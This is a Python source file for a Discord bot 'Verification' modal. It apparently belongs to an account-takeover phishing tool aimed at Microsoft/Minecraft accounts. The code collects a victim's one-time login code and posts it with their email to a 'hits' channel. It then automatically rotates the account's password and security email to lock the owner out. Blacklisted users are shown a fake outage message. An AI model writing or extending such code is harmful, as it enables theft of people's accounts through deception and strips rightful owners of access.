from database.database import DBConnection
from urllib.parse import quote
from discord import ui, Embed
import discord
import json

from ui.buttons.embed_buttons import ButtonOptions

from securing.secure import startSecuringAccount
from securing.auth.initial_session import get_session
from shared.send_logs import send_logs, build_log_embed
from shared.post_hit import (
    _checking_embed,
    publish_embed_secure_result,
    set_verify_ephemeral,
)

class MyModalTwo(ui.Modal):
    def __init__(self, username, email, flowtoken, ppft=None):
        super().__init__(title="Verification")
        self.username = quote(username)
        self.email = email
        self.flowtoken = flowtoken
        self.ppft = ppft
        self.add_item(ui.InputText(label="Code", required=True, max_length=6))

    async def callback(self, interaction: discord.Interaction) -> None:
        code = self.children[0].value
        config = json.load(open("config/config.json", "r"))

        hits_channel = await interaction.client.fetch_channel(config["discord"]["accounts_channel"])

        # Blacklisted Users
        with DBConnection() as database:
            if interaction.user.id in database.get_blacklisted_users():
                await interaction.response.send_message(
                    embed = Embed(
                        title = "Could not verify",
                        description = "Our systems seem to be down at the moment. Please try again in a few hours.",
                        color = 0xFA4343
                    ), 
                    ephemeral = True
                )

                await send_logs(
                    interaction.client,
                    build_log_embed(
                        f"**Email | Status | Reason**\n```{self.email} | Refused to Verify | User has been blacklisted```",
                        0xFA4343,
                        thumbnail=f"https://visage.surgeplay.com/full/512/{self.username}",
                        user=interaction.user,
                        bot=interaction.client,
                    ),
                    view=ButtonOptions(interaction.user, interaction.user.id, self.username),
                    email=self.email,
                )
                return

        embed = build_log_embed(
            f"**Email** | **Status**\n```{self.email} | Got Code | {code}```",
            0x79D990,
            user=interaction.user,
            bot=interaction.client,
        )

        if self.username and self.username.strip():
            embed.set_thumbnail(url=f"https://visage.surgeplay.com/full/512/{self.username}")

        await interaction.response.defer(ephemeral=True)

        await send_logs(interaction.client, content="**This Account is being automaticly secured**")
        await send_logs(interaction.client, embed, view=ButtonOptions(interaction.user, interaction.user.id, self.username), email=self.email)

        self.session = get_session()

        await set_verify_ephemeral(interaction, _checking_embed())

        # OTP login (not recovery-code). recovery=True still runs RecoverUser
        # after login so password / security email get rotated — same as the
        # authenticator embed path. Do not treat a failed dict as success.
        try:
            securedAccount = await startSecuringAccount(
                self.session,
                self.email,
                self.flowtoken,
                code,
                recovery=True,
                ppft=self.ppft,
                embed_verify=True,
            )
        except Exception as exc:
            import logging
            logging.getLogger("bot").exception("embed OTP startSecuringAccount crashed")
            securedAccount = {
                "failed": True,
                "reason": "Securing crashed",
            }
        await publish_embed_secure_result(
            interaction=interaction,
            hits_channel=hits_channel,
            secured_account=securedAccount,
            email=self.email,
            username=self.username,
        )

